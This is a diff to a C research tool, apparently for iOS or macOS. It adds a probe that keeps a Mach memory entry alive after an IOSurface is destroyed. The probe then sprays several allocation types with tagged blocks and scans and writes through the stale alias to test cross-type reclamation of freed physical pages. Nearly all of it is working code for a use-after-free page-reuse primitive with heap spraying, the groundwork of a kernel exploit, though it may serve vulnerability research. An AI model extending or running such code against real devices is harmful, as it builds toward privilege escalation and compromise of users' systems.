@@ -1320,14 +1320,13 @@ static iosr_getalloc_fn g_iosr_getalloc;
 static iosr_mach_vm_map_fn g_iosr_vm_map;
 static iosr_ref_t g_iosr_keep[IOSR_SPRAY];
 
-static iosr_ref_t iosr_make(int use_region)
+static iosr_ref_t iosr_make_sized(int use_region, long alloc)
 {
     CFMutableDictionaryRef props = CFDictionaryCreateMutable(
         NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     if (!props) return NULL;
 
     int w = 64, h = 2, bpe = 4, row = 256, pix = 1111970369 /* 'BGRA' */;
-    long alloc = IOSR_ALLOC;
     CFNumberRef n;
     n = CFNumberCreate(NULL, kCFNumberIntType, &w);    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), n);         CFRelease(n);
     n = CFNumberCreate(NULL, kCFNumberIntType, &h);    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), n);        CFRelease(n);
@@ -1342,6 +1341,11 @@ static iosr_ref_t iosr_make(int use_region)
     iosr_ref_t s = g_iosr_create(props);
     CFRelease(props);
     return s;
+}
+
+static iosr_ref_t iosr_make(int use_region)
+{
+    return iosr_make_sized(use_region, IOSR_ALLOC);
 }
 
 static int iosr_spray(int use_region, int count)
@@ -1502,5 +1506,416 @@ int iosurf_race_probe(int *stages)
     if (a2) vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
     mach_port_deallocate(mach_task_self(), obj);
     iosr_release_all();
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* IOSurface freed-page reclaim-type expansion (cross-type probe).     */
+/*                                                                     */
+/* `--iosurfrace` proved a surviving memory entry names the physical   */
+/* pages of a destroyed IOSurface and follows them into a NEW          */
+/* IOSurface. This probe asks the next question: can those pages be    */
+/* taken by an allocation that is NOT an IOSurface?                    */
+/*                                                                     */
+/* Method: for each (surface kind, reclaimer kind) pair, create a     */
+/* fresh surface, wrap its base in a memory entry, confirm the alias,  */
+/* deallocate every user mapping, destroy the surface, then spray one  */
+/* reclaimer type whose blocks carry unique tags. Re-map the entry and */
+/* scan the whole object for a tag. A tag seen through the stale alias */
+/* means an allocation outside the IOSurface allocator landed on the   */
+/* released physical pages - cross-type reclamation.                   */
+/*                                                                     */
+/* Reclaimer kinds: vm_allocate, anonymous mmap, malloc, file-backed   */
+/* mmap, and IOSurface itself (positive control).                      */
+/*                                                                     */
+/* All writes are 4 bytes into blocks this app owns, or into a         */
+/* reclaimed IOSurface this app created. Reads through the stale       */
+/* alias are bounded to the object size.                               */
+/* ------------------------------------------------------------------ */
+
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+
+enum {
+    RCL_KIND_VM = 1,
+    RCL_KIND_MMAP_ANON,
+    RCL_KIND_MALLOC,
+    RCL_KIND_FILE,
+    RCL_KIND_IOSRF
+};
+
+#define RCL_N 48
+#define RCL_ALLOC 0x8000
+
+static void      *g_rcl_ptr[RCL_N];
+static size_t     g_rcl_len[RCL_N];
+static int        g_rcl_kind[RCL_N];
+static int        g_rcl_n;
+
+static iosr_ref_t g_rcl_surf[RCL_N];
+static int        g_rcl_nsurf;
+
+typedef struct { uint32_t tag; int kind; int idx; } rcl_tag_t;
+static rcl_tag_t  g_rcl_tag[RCL_N];
+static int        g_rcl_ntag;
+
+static uint32_t rcl_tag_of(int kind, int idx)
+{
+    return 0x5A5A0000u | ((uint32_t)(kind & 0xF) << 12) | (uint32_t)(idx & 0xFFF);
+}
+
+static void rcl_track(void *p, size_t len, int kind)
+{
+    if (g_rcl_n >= RCL_N) return;
+    g_rcl_ptr[g_rcl_n] = p;
+    g_rcl_len[g_rcl_n] = len;
+    g_rcl_kind[g_rcl_n] = kind;
+    g_rcl_n++;
+}
+
+static void rcl_record(int kind, int idx)
+{
+    if (g_rcl_ntag >= RCL_N) return;
+    g_rcl_tag[g_rcl_ntag].tag = rcl_tag_of(kind, idx);
+    g_rcl_tag[g_rcl_ntag].kind = kind;
+    g_rcl_tag[g_rcl_ntag].idx = idx;
+    g_rcl_ntag++;
+}
+
+static void rcl_release_all(void)
+{
+    for (int i = 0; i < g_rcl_n; i++) {
+        if (!g_rcl_ptr[i]) continue;
+        switch (g_rcl_kind[i]) {
+        case RCL_KIND_VM:
+            vm_deallocate(mach_task_self(), (vm_address_t)g_rcl_ptr[i],
+                          (vm_size_t)g_rcl_len[i]);
+            break;
+        case RCL_KIND_MMAP_ANON:
+        case RCL_KIND_FILE:
+            munmap(g_rcl_ptr[i], g_rcl_len[i]);
+            break;
+        case RCL_KIND_MALLOC:
+            free(g_rcl_ptr[i]);
+            break;
+        default:
+            break;
+        }
+        g_rcl_ptr[i] = NULL;
+    }
+    for (int i = 0; i < g_rcl_nsurf; i++) {
+        if (g_rcl_surf[i]) CFRelease(g_rcl_surf[i]);
+        g_rcl_surf[i] = NULL;
+    }
+    g_rcl_n = 0;
+    g_rcl_nsurf = 0;
+}
+
+static int rcl_spray_vm(size_t len, int kind)
+{
+    int made = 0;
+    for (int i = 0; i < RCL_N; i++) {
+        vm_address_t a = 0;
+        kern_return_t kr = vm_allocate(mach_task_self(), &a, (vm_size_t)len,
+                                       VM_FLAGS_ANYWHERE);
+        if (kr != KERN_SUCCESS || a == 0) break;
+        *(volatile uint32_t *)(uintptr_t)a = rcl_tag_of(kind, i);
+        rcl_track((void *)(uintptr_t)a, len, kind);
+        rcl_record(kind, i);
+        made++;
+    }
+    return made;
+}
+
+static int rcl_spray_mmap(size_t len, int kind)
+{
+    int made = 0;
+    for (int i = 0; i < RCL_N; i++) {
+        void *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
+                       MAP_ANON | MAP_PRIVATE, -1, 0);
+        if (p == MAP_FAILED) break;
+        *(volatile uint32_t *)(uintptr_t)p = rcl_tag_of(kind, i);
+        rcl_track(p, len, kind);
+        rcl_record(kind, i);
+        made++;
+    }
+    return made;
+}
+
+static int rcl_spray_malloc(size_t len, int kind)
+{
+    int made = 0;
+    for (int i = 0; i < RCL_N; i++) {
+        void *p = malloc(len);
+        if (!p) break;
+        *(volatile uint32_t *)(uintptr_t)p = rcl_tag_of(kind, i);
+        rcl_track(p, len, kind);
+        rcl_record(kind, i);
+        made++;
+    }
+    return made;
+}
+
+static int rcl_spray_file(const char *dir, size_t len, int kind)
+{
+    char path[512];
+    snprintf(path, sizeof(path), "%s/rclfile.bin", dir ? dir : "/tmp");
+    int fd = open(path, O_CREAT | O_RDWR | O_TRUNC, 0600);
+    if (fd < 0) {
+        mep_log("[-] iosurfreclaim: open(%s) failed errno=%d", path, errno);
+        return 0;
+    }
+    if (ftruncate(fd, (off_t)len * RCL_N) != 0) {
+        mep_log("[-] iosurfreclaim: ftruncate failed errno=%d", errno);
+        close(fd);
+        return 0;
+    }
+    int made = 0;
+    for (int i = 0; i < RCL_N; i++) {
+        void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
+                       (off_t)i * (off_t)len);
+        if (p == MAP_FAILED) break;
+        *(volatile uint32_t *)(uintptr_t)p = rcl_tag_of(kind, i);
+        msync(p, len, MS_ASYNC);
+        rcl_track(p, len, kind);
+        rcl_record(kind, i);
+        made++;
+    }
+    close(fd);
+    return made;
+}
+
+static int rcl_spray_iosrf(size_t len, int kind, int use_region)
+{
+    int made = 0;
+    for (int i = 0; i < RCL_N; i++) {
+        iosr_ref_t s = iosr_make_sized(use_region, (long)len);
+        if (!s) break;
+        void *base = g_iosr_getbase(s);
+        if (base) *(volatile uint32_t *)(uintptr_t)base = rcl_tag_of(kind, i);
+        if (g_rcl_nsurf < RCL_N) g_rcl_surf[g_rcl_nsurf++] = s;
+        rcl_record(kind, i);
+        made++;
+    }
+    return made;
+}
+
+/* Map the surviving entry and scan it for any tag recorded this round.
+   Returns 1 on a match, 0 on none, -1 if the entry could not be mapped. */
+static int rcl_check(mach_port_t obj, mach_vm_size_t esz, int round,
+                     int *hit_kind, int *hit_idx, uint64_t *hit_off,
+                     uint32_t *w0)
+{
+    mach_vm_address_t a = 0;
+    kern_return_t kr = g_iosr_vm_map(mach_task_self(), &a, esz, 0,
+                                     VM_FLAGS_ANYWHERE, obj, 0, FALSE,
+                                     VM_PROT_READ | VM_PROT_WRITE,
+                                     VM_PROT_READ | VM_PROT_WRITE,
+                                     VM_INHERIT_NONE);
+    if (w0) *w0 = 0;
+    mep_log("[*] iosurfreclaim r%d map entry -> kr=%d (0x%x) at 0x%llx",
+            round, (int)kr, (unsigned)kr, (unsigned long long)a);
+    if (kr != KERN_SUCCESS || a == 0) return -1;
+
+    uint32_t first = *(volatile uint32_t *)(uintptr_t)a;
+    if (w0) *w0 = first;
+    int found = 0;
+    for (size_t off = 0; off + 4 <= esz; off += 4) {
+        uint32_t v = *(volatile uint32_t *)(uintptr_t)(a + off);
+        for (int i = 0; i < g_rcl_ntag; i++) {
+            if (v == g_rcl_tag[i].tag) {
+                mep_log("[*] iosurfreclaim r%d MATCH kind=%d idx=%d off=0x%zx val=0x%08x",
+                        round, g_rcl_tag[i].kind, g_rcl_tag[i].idx, off, v);
+                *hit_kind = g_rcl_tag[i].kind;
+                *hit_idx = g_rcl_tag[i].idx;
+                *hit_off = off;
+                found = 1;
+                break;
+            }
+        }
+        if (found) break;
+    }
+    if (!found)
+        mep_log("[*] iosurfreclaim r%d no tag visible; word0=0x%08x", round, first);
+    vm_deallocate(mach_task_self(), (vm_address_t)a, (vm_size_t)esz);
+    return found;
+}
+
+/* One (surface kind, reclaimer kind) experiment. */
+static int rcl_round(const char *dir, int use_region, size_t alloc, int sweeper,
+                     int round_no, int *stage_val)
+{
+    int hit_kind = 0, hit_idx = -1, found = 0, made = 0;
+    uint64_t hit_off = 0;
+    uint32_t w0 = 0;
+
+    rcl_release_all();
+    g_rcl_ntag = 0;
+
+    iosr_ref_t s = iosr_make_sized(use_region, (long)alloc);
+    if (!s) {
+        mep_log("[-] iosurfreclaim: surface create failed region=%d alloc=0x%zx",
+                use_region, alloc);
+        return -1;
+    }
+    uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
+    size_t asz = g_iosr_getalloc(s);
+    uint32_t marker = 0xC0DE0000u | (uint32_t)(use_region & 1);
+    if (base) *(volatile uint32_t *)(uintptr_t)base = marker;
+    uint32_t rb = base ? *(volatile uint32_t *)(uintptr_t)base : 0;
+    mep_log("[*] iosurfreclaim r%d region=%d alloc=0x%zx id=0x%x base=0x%llx marker=0x%08x rb=0x%08x",
+            round_no, use_region, asz, g_iosr_getid(s),
+            (unsigned long long)base, marker, rb);
+
+    mach_vm_size_t esz = (mach_vm_size_t)asz;
+    mach_port_t obj = MACH_PORT_NULL;
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &esz,
+                                                 (mach_vm_offset_t)base,
+                                                 VM_PROT_READ | VM_PROT_WRITE,
+                                                 &obj, MACH_PORT_NULL);
+    mep_log("[*] iosurfreclaim r%d entry(size=0x%llx) -> kr=%d (0x%x) handle=0x%x",
+            round_no, (unsigned long long)esz, (int)kr, (unsigned)kr,
+            (unsigned)obj);
+    if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
+        CFRelease(s);
+        return -1;
+    }
+
+    mach_vm_address_t a1 = 0;
+    kr = g_iosr_vm_map(mach_task_self(), &a1, esz, 0, VM_FLAGS_ANYWHERE, obj, 0,
+                       FALSE, VM_PROT_READ | VM_PROT_WRITE,
+                       VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+    uint32_t m1 = 0;
+    if (kr == KERN_SUCCESS && a1) m1 = *(volatile uint32_t *)(uintptr_t)a1;
+    mep_log("[*] iosurfreclaim r%d alias1 kr=%d marker=0x%08x same=%s",
+            round_no, (int)kr, m1, (m1 == marker) ? "YES" : "no");
+    if (a1) vm_deallocate(mach_task_self(), (vm_address_t)a1, (vm_size_t)esz);
+
+    CFRelease(s);
+    mep_log("[*] iosurfreclaim r%d surface released; only the entry remains",
+            round_no);
+
+    switch (sweeper) {
+    case RCL_KIND_VM:        made = rcl_spray_vm(alloc, sweeper); break;
+    case RCL_KIND_MMAP_ANON: made = rcl_spray_mmap(alloc, sweeper); break;
+    case RCL_KIND_MALLOC:    made = rcl_spray_malloc(alloc, sweeper); break;
+    case RCL_KIND_FILE:      made = rcl_spray_file(dir, alloc, sweeper); break;
+    case RCL_KIND_IOSRF:     made = rcl_spray_iosrf(alloc, sweeper, use_region); break;
+    default: break;
+    }
+    mep_log("[*] iosurfreclaim r%d sweep kind=%d made=%d", round_no, sweeper, made);
+
+    if (sweeper == RCL_KIND_IOSRF) {
+        for (int i = 0; i < g_rcl_nsurf; i++) {
+            uint64_t b = (uint64_t)(uintptr_t)g_iosr_getbase(g_rcl_surf[i]);
+            if (b == base) {
+                mep_log("[*] iosurfreclaim r%d old base handed to sprayed surface idx=%d",
+                        round_no, i);
+                break;
+            }
+        }
+    }
+
+    found = rcl_check(obj, esz, round_no, &hit_kind, &hit_idx, &hit_off, &w0);
+
+    /* Write-direction confirmation, only when the reclaimer is a surface we
+       own and positively identified: write through the stale alias and read
+       through the reclaimed surface's own mapping. */
+    if (found && sweeper == RCL_KIND_IOSRF && hit_idx >= 0 &&
+        hit_idx < g_rcl_nsurf && g_rcl_surf[hit_idx]) {
+        mach_vm_address_t a2 = 0;
+        kr = g_iosr_vm_map(mach_task_self(), &a2, esz, 0, VM_FLAGS_ANYWHERE,
+                           obj, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
+                           VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS && a2) {
+            uint32_t wv = 0x88880000u | (uint32_t)(round_no & 0xff);
+            *(volatile uint32_t *)(uintptr_t)a2 = wv;
+            uint32_t ob = *(volatile uint32_t *)(uintptr_t)
+                              g_iosr_getbase(g_rcl_surf[hit_idx]);
+            mep_log("[*] iosurfreclaim WRITE-DIR: wrote 0x%08x through stale alias, "
+                    "reclaimed surface reads 0x%08x -> %s",
+                    wv, ob, (ob == wv) ? "CONFIRMED" : "no");
+            vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
+        }
+    }
+
+    mep_log("[*] iosurfreclaim r%d VERDICT hit=%d kind=%d idx=%d off=0x%llx "
+            "word0=0x%08x marker_intact=%s",
+            round_no, found, hit_kind, hit_idx, (unsigned long long)hit_off, w0,
+            (w0 == marker) ? "YES" : "no");
+
+    mach_port_deallocate(mach_task_self(), obj);
+    if (stage_val) *stage_val = found ? 1 : 0;
+    return found;
+}
+
+int iosurf_reclaim_probe(const char *dir, int *stages)
+{
+    if (!stages) return -1;
+    for (int i = 0; i < 32; i++) stages[i] = 0;
+
+    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
+                      RTLD_NOW);
+    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
+    if (!fh) {
+        mep_log("[-] iosurfreclaim: dlopen IOSurface failed: %s", dlerror());
+        return 0;
+    }
+
+    g_iosr_create  = (iosr_create_fn)dlsym(fh, "IOSurfaceCreate");
+    g_iosr_getid   = (iosr_getid_fn)dlsym(fh, "IOSurfaceGetID");
+    g_iosr_getbase = (iosr_getbase_fn)dlsym(fh, "IOSurfaceGetBaseAddress");
+    g_iosr_getalloc = (iosr_getalloc_fn)dlsym(fh, "IOSurfaceGetAllocSize");
+    void *lh = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
+    g_iosr_vm_map = (iosr_mach_vm_map_fn)dlsym(lh ? lh : RTLD_DEFAULT,
+                                               "mach_vm_map");
+
+    mep_log("[*] iosurfreclaim syms create=%p id=%p base=%p alloc=%p mach_vm_map=%p",
+            (void *)g_iosr_create, (void *)g_iosr_getid, (void *)g_iosr_getbase,
+            (void *)g_iosr_getalloc, (void *)g_iosr_vm_map);
+    if (!g_iosr_create || !g_iosr_getid || !g_iosr_getbase ||
+        !g_iosr_getalloc || !g_iosr_vm_map) {
+        mep_log("[-] iosurfreclaim: a required symbol is missing");
+        return 0;
+    }
+
+    static const int sweepers[] = {
+        RCL_KIND_VM, RCL_KIND_MMAP_ANON, RCL_KIND_MALLOC, RCL_KIND_FILE,
+        RCL_KIND_IOSRF
+    };
+    static const char *names[] = { "?", "vm", "mmap", "malloc", "file", "iosrf" };
+
+    rcl_release_all();
+    int rn = 0;
+
+    /* Sets 1-2: PurpleGfxMem and plain surfaces at 0x8000, five reclaimers. */
+    for (int ur = 0; ur < 2; ur++) {
+        for (int si = 0; si < 5; si++) {
+            int st = 0;
+            rcl_round(dir, ur, RCL_ALLOC, sweepers[si], rn, &st);
+            mep_log("[*] iosurfreclaim round %d region=%d sweeper=%s stage=%d",
+                    rn, ur, names[sweepers[si]], st);
+            stages[rn] = st;
+            rn++;
+        }
+    }
+
+    /* Set 3: IOSurface-vs-IOSurface recycling across size classes (control). */
+    size_t cls[] = { 0x4000, 0x8000, 0x10000 };
+    for (int ci = 0; ci < 3; ci++) {
+        int st = 0;
+        rcl_round(dir, 1, cls[ci], RCL_KIND_IOSRF, rn, &st);
+        mep_log("[*] iosurfreclaim round %d region=1 sweeper=iosrf class=0x%zx stage=%d",
+                rn, cls[ci], st);
+        stages[rn] = st;
+        rn++;
+    }
+
+    rcl_release_all();
+    int hits = 0;
+    for (int i = 0; i < rn; i++) if (stages[i]) hits++;
+    mep_log("[*] iosurfreclaim done rounds=%d hits=%d", rn, hits);
     return 0;
 }
